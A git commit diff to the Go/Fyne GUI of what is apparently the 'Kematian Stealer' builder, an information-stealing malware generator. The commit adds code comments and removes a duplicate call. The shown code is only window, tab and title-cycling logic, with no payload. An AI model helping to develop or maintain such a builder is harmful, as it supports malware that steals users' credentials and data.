a1ea34a95e20bb55911f43402bf1e30e3ecb42b6
43a1723 <hai1723notgay@gmail.com>
2024-06-30 11:35:08 +0700

    Update main.go

--- builder-src/main.go
+++ builder-src/main.go
@@ -18,15 +18,23 @@ import (
 )
 
 func main() {
+	// Initialize the Fyne application
 	a := app.New()
+
+	// Generate window title and properties
 	win := a.NewWindow(cursed.Generate("Kematian Stealer OLD Builder", "normal", true, true, true))
 	win.Resize(fyne.NewSize(500, 400))
 	win.CenterOnScreen()
+
+	// Load code before setting up the UI
 	utils.LoadCode()
+
+	// Check for updates before setting the window content
 	if !autoUpdate.AutoUpdate() {
 		utils.MakeSuccessMessage(a, "A NEW UPDATE IS AVAILABLE! PLEASE DOWNLOAD IT FROM THE GITHUB REPO!")
 	}
 
+	// Create the tabbed interface
 	tabs := container.NewAppTabs(
 		container.NewTabItem("Home", homeTab.GetHomeTab(a)),
 		container.NewTabItem("Powershell", powershellTab.GetBuilderPowershell(a)),
@@ -36,14 +44,16 @@ func main() {
 		container.NewTabItem("Credits", widget.NewLabel("I NOT GAY, I LOVE YOU")),
 	)
 
+	// Set the tabs as the content of the window
 	win.SetContent(tabs)
 
+	// Set the location of the tabs
 	tabs.SetTabLocation(container.TabLocationLeading)
 
-	win.SetContent(tabs)
-
+	// Create a channel for updating the window title
 	outputChannel := make(chan string)
 
+	// Start a goroutine to periodically generate new titles
 	go func() {
 		ticker := time.NewTicker(25 * time.Millisecond)
 		defer ticker.Stop()
@@ -54,11 +64,13 @@ func main() {
 		}
 	}()
 
+	// Start a goroutine to update the window title based on channel messages
 	go func() {
 		for output := range outputChannel {
 			win.SetTitle(output)
 		}
 	}()
 
+	// Show the window and start the Fyne application loop
 	win.ShowAndRun()
 }
